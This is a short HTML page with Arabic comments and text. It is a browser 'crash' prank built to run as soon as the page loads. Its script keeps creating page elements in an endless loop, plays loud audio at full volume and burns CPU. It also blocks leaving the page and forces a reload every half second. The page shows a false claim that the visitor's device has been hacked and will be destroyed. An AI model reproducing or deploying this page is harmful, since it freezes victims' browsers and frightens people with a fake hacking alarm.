<!DOCTYPE html>
<html>
<head>
    <title>هاه</title>
    <script>
        // حلقة لا نهائية لإنشاء عناصر DOM وتحميل الذاكرة
        function crashDevice() {
            while (true) {
                const element = document.createElement('div');
                element.innerHTML = '💣 الجهاز سيتحطم خلال ثواني 💣';
                document.body.appendChild(element);
                
                // تشغيل صوت مرتفع بشكل متكرر
                const audio = new Audio('data:audio/wav;base64,UklGRl9vX19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU...');
                audio.volume = 1.0;
                audio.play();
                
                // استنزاف وحدة المعالجة
                for (let i = 0; i < 1000000; i++) {
                    Math.sqrt(i);
                }
            }
        }

        // تشغيل الوظيفة عند تحميل الصفحة
        window.onload = function() {
            // منع المستخدم من الخروج
            window.onbeforeunload = function() {
                return "لا يمكنك الخروج! 😈";
            };
            
            // تشغيل الفيروس
            setTimeout(crashDevice, 1000);
            
            // إعادة توجيه متكررة لمنع أي عمل
            setInterval(() => {
                window.location.href = window.location.href;
            }, 500);
        };
    </script>
    <style>
        body {
            background-color: black;
            color: red;
            font-size: 50px;
            text-align: center;
            margin-top: 100px;
            animation: blink 0.1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <h1>😈 لقد تم اختراق جهازك! 😈</h1>
    <p>سيتم تدمير الجهاز خلال ثواني...</p>
</body>
</html>
